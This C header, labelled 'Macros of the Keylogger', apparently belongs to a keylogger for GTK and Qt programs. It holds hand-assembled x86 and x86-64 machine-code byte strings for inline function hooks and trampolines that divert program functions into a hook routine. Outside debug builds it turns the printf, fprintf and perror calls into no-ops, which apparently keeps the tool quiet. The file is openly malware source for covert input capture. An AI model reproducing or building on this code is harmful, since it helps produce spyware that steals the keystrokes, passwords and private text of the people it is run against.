#ifndef __KL_MACROS
  #define __KL_MACROS

  /*
   * Macros of the Keylogger
   */

  #ifndef KL_DEBUG
    #define printf(fmt, ...)
    #define fprintf(str, fmt, ...)
    #define perror(str)
  #endif

  #define GRAPHIC_LIB_GTK2 1
  #define GRAPHIC_LIB_GTK3 2
  #define GRAPHIC_LIB_QT 3

  #define PAGE_SIZE 4096
  #define PAGE_ROUND_DOWN(x) (((unsigned long)(x)) & (~(PAGE_SIZE-1)))
  #define PAGE_ROUND_UP(x) ((((unsigned long)(x)) + PAGE_SIZE-1) & (~(PAGE_SIZE-1)))

  #ifdef __x86_64__

    // hook:
    // push rax
    // mov rax, ADDR_hook_entry
    // jmp rax
    // pop rax <-- ADDR_return_from_trampoline

    #define HOOK_PATCH "\x50\x48\xb8\x10\x10\x10\x10\x10\x10\x10\x10\xff\xe0\x58"
    #define HOOK_PATCH_SZ 14

    // trampoline:
    // repaired_opcodes
    // push rax
    // mov rax, ADDR_return_from_trampoline
    // jmp rax

    #define TRAMPOLINE_EPILOGUE "\x50\x48\xb8\x10\x10\x10\x10\x10\x10\x10\x10\xff\xe0"
    #define TRAMPOLINE_EPILOGUE_SZ 13

    //  <Dreg> 0000000077237995 | 50                                        | push rax                                       |
    //  <Dreg> 0000000077237996 | 48 B8 86 79 24 77 00 00 00 00             | movabs rax,ntdll.77247986                      |
    //  <Dreg> 00000000772379A0 | 48 8B 00                                  | mov rax,qword ptr ds:[rax]                     |
    //  <Dreg> 00000000772379A3 | 48 87 04 24                               | xchg qword ptr ss:[rsp],rax                    |

    #define PUSH_RIP_REL "\x50\x48\xB8\x86\x79\x24\x77\x00\x00\x00\x00\x48\x8B\x00\x48\x87\x04\x24"
    #define PUSH_RIP_REL_SZ 18

  #else

    //
    // This way we use to jump to the hook_entry when the function to hook is called.
    //
    // push ADDR_OF_HOOK_ENTRY
    // ret
    //

    #define HOOK_PATCH "\x68\xbe\xba\xad\xde\xc3"
    #define HOOK_PATCH_SZ 6

    //
    // This is the rebuild opcodes if we found a call in the function to hook opcodes.
    //
    // jmp _call
    // _push:
    //  push ADDR_TO_CALL
    //  ret
    // _call:
    //  call _push
    // -> Execution flow continues here, after call.
    //

    #define CALL_REBUILD "\xeb\x07\xff\x35\xbe\xba\xad\xde\xc3\xe8\xf4\xff\xff\xff"
    #define CALL_REBUILD_SZ 14

  #endif

#endif
